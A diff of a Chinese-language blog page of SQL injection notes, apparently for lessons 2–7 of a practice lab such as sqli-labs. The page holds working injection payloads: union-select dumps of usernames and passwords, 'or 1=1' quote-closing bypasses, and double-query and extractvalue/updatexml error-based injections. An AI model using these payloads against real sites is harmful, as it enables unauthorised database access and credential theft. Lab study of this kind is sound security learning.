@@ -86,7 +86,7 @@
 <meta property="og:site_name" content="Jason&#39;s sky">
 <meta property="og:description" content="php与mysqlApache24\htdocs\phpMyAdmin\libraries\config.default.php 设置     $cfg[&amp;#39;Servers&amp;#39;][$i][&amp;#39;password&amp;#39;] = &amp;#39;sqlpassword&amp;#39;           localhost/phpMyAdmin/index.php 进入php数据库管理">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-06-04T12:40:03.828Z">
+<meta property="og:updated_time" content="2018-07-08T15:11:15.915Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入">
 <meta name="twitter:description" content="php与mysqlApache24\htdocs\phpMyAdmin\libraries\config.default.php 设置     $cfg[&amp;#39;Servers&amp;#39;][$i][&amp;#39;password&amp;#39;] = &amp;#39;sqlpassword&amp;#39;           localhost/phpMyAdmin/index.php 进入php数据库管理">
@@ -393,15 +393,17 @@
 <p>limit后面跟：<br>–+  一些情况下浏览器把+编码成空格<br>– k </p>
 <h1 id="lesson2"><a href="#lesson2" class="headerlink" title="lesson2"></a>lesson2</h1><p>get整型注入：</p>
 <pre><code>?id=-1 union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 1,1 %23
-</code></pre><h1 id="lesson3"><a href="#lesson3" class="headerlink" title="lesson3"></a>lesson3</h1><p>单引号符号变形:<br><code>id=-1&#39;) or 1=1%23</code><br>爆：</p>
+</code></pre><h1 id="lesson3"><a href="#lesson3" class="headerlink" title="lesson3"></a>lesson3</h1><p>单引号符号变形:<br>    id=-1’) or 1=1%23<br>爆：</p>
 <pre><code>?id=-1&#39;)  union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 1,1 %23
-</code></pre><h1 id="lesson4"><a href="#lesson4" class="headerlink" title="lesson4"></a>lesson4</h1><p>双引号闭合：<br><code>?id =1&quot;) or 1=1 %23·</code></p>
+</code></pre><h1 id="lesson4"><a href="#lesson4" class="headerlink" title="lesson4"></a>lesson4</h1><p>双引号闭合：<br>    ?id =1”) or 1=1 %23</p>
 <h1 id="lesson5"><a href="#lesson5" class="headerlink" title="lesson5"></a>lesson5</h1><p>双注入查询</p>
-<p><code>?id=1&#39; union select count(*),1, concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;</code><br>同理查询把version()换成database(),user(),datadir();</p>
-<p>参考这两个函数注入：<br>EXTRACTVALUE (XML_document, XPath_string);<br>UPDATEXML (XML_document, XPath_string, new_value);    </p>
-<p><code>?id=1&#39; or (extractvalue(1,concat(0x7e,(select user()),0x7e) %23</code></p>
-<p><code>?id=1&#39; or (updatexml(1,concat(0x7e,(select user()),0x7e),1) %23</code></p>
-<h1 id="lesson6"><a href="#lesson6" class="headerlink" title="lesson6"></a>lesson6</h1><p>双注入双引号<br>payload:<br><code>?id=1&quot; or 1=1%23</code></p>
+<pre><code>?id=1&#39; union select count(*),1, concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;
+</code></pre><p>同理查询把version()换成database(),user(),datadir();</p>
+<p>参考这两个函数注入：<br>    EXTRACTVALUE (XML_document, XPath_string);<br>    UPDATEXML (XML_document, XPath_string, new_value);    </p>
+<pre><code>?id=1&#39; or (extractvalue(1,concat(0x7e,(select user()),0x7e) %23
+
+?id=1&#39; or (updatexml(1,concat(0x7e,(select user()),0x7e),1) %23
+</code></pre><h1 id="lesson6"><a href="#lesson6" class="headerlink" title="lesson6"></a>lesson6</h1><p>双注入双引号<br>payload:<br>    ?id=1” or 1=1%23</p>
 <h1 id="lesson7"><a href="#lesson7" class="headerlink" title="lesson7"></a>lesson7</h1>
       
     </div>
